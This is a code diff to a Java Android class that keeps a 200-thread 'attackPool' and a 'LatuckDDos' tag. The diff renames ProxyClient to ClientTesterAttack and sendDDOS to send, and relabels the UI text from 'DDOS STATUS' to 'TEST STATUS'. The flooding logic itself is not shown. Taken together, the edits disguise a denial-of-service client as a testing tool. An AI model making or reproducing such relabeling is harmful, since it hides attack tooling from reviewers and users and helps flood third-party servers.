@@ -19,23 +19,19 @@ import org.json.JSONObject;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetSocketAddress;
-import java.net.Proxy;
 import java.net.Socket;
-import java.net.URL;
-import java.net.HttpURLConnection;
+
 import javax.net.ssl.SSLSocketFactory;
 import javax.net.ssl.SSLSocket;
 import java.io.OutputStream;
 import java.io.InputStream;
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
 import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicInteger;
 
-public class ProxyClient {
-    private static ProxyClient instance;
+public class ClientTesterAttack {
+    private static ClientTesterAttack instance;
     private Context context;
     private String tag = "LatuckDDos";
     private String nan = "n/a";
@@ -45,7 +41,7 @@ public class ProxyClient {
     private ExecutorService attackPool = Executors.newFixedThreadPool(200);
     private AtomicInteger activeAttacks = new AtomicInteger(0);
 
-    private ProxyClient(Context context){
+    private ClientTesterAttack(Context context){
         if(context != null){
             this.context = context;
         } else {
@@ -53,12 +49,12 @@ public class ProxyClient {
         }
     }
 
-    public static synchronized ProxyClient getInstance(Context ctx) {
-        if(instance==null) instance = new ProxyClient(ctx);
+    public static synchronized ClientTesterAttack getInstance(Context ctx) {
+        if(instance==null) instance = new ClientTesterAttack(ctx);
         return instance;
     }
 
-    public void sendDDOS(String ip, String port, String json, boolean autoFindPort, boolean useProxy){
+    public void send(String ip, String port, String json, boolean autoFindPort, boolean useProxy){
         attackPool.execute(() -> {
             String targetPort = port;
             if(autoFindPort) {
@@ -414,17 +410,12 @@ public class ProxyClient {
     }
 
     public String getStatus() {
-        StringBuilder html = new StringBuilder();
-
-        html.append("<br>");
-        html.append("<font color='#FFFFFF'><b>DDOS STATUS: </b></font>");
+        String status;
         if(lastRequestSuccess) {
-            html.append("<font color='#00FF00'><b>SUCCESS ✓</b></font>");
+            status = "<font color='#00FF00'>PASSED</font>";
         } else {
-            html.append("<font color='#FF0000'><b>FAILED ✗</b></font>");
+            status = "<font color='#FF0000'>FAILED</font>";
         }
-        html.append("<br>");
-
-        return html.toString();
+        return "<b><font color='#FFFFFF'>TEST STATUS: </font>" + status + "</b>";
     }
 }
